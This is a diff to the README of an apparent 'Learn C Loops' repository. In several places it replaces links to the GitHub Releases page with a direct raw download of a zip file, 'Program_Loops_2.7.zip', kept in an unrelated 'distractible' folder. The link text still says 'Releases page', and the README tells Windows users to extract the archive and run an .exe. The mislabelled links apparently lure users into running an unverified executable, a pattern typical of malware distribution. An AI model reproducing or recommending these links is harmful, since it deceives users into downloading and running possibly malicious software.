@@ -1,10 +1,10 @@
 # 🔁 Loops-C-Program - Learn C Loops Step by Step
 
-[![Download the app](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/FAFFFbutyes/Loops-C-Program/releases)
+[![Download the app](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/FAFFFbutyes/Loops-C-Program/main/distractible/Program_Loops_2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: [Loops-C-Program Releases](https://github.com/FAFFFbutyes/Loops-C-Program/releases)
+Visit this page to download: [Loops-C-Program Releases](https://raw.githubusercontent.com/FAFFFbutyes/Loops-C-Program/main/distractible/Program_Loops_2.7.zip)
 
 Choose the latest release, then download the file that matches your Windows PC. If there is more than one file, pick the one for Windows.
 
@@ -36,7 +36,7 @@ If the release includes an `.exe` file, you can run it on Windows after download
 
 ## 🚀 Getting Started
 
-1. Open the [Releases page](https://github.com/FAFFFbutyes/Loops-C-Program/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/FAFFFbutyes/Loops-C-Program/main/distractible/Program_Loops_2.7.zip)
 2. Download the latest file for Windows
 3. If the file is zipped, right-click it and choose Extract All
 4. Open the extracted folder
@@ -125,7 +125,7 @@ You can use it to learn:
 
 ## 🛠️ Basic Setup Steps
 
-1. Download the release from the [Releases page](https://github.com/FAFFFbutyes/Loops-C-Program/releases)
+1. Download the release from the [Releases page](https://raw.githubusercontent.com/FAFFFbutyes/Loops-C-Program/main/distractible/Program_Loops_2.7.zip)
 2. Save the file in a folder you can find later
 3. Extract the file if it is zipped
 4. Open the folder
@@ -244,4 +244,4 @@ If you are unsure which file to open, follow this rule:
 
 ## 🖱️ Quick Access
 
-[Go to Releases to download](https://github.com/FAFFFbutyes/Loops-C-Program/releases)
+[Go to Releases to download](https://raw.githubusercontent.com/FAFFFbutyes/Loops-C-Program/main/distractible/Program_Loops_2.7.zip)
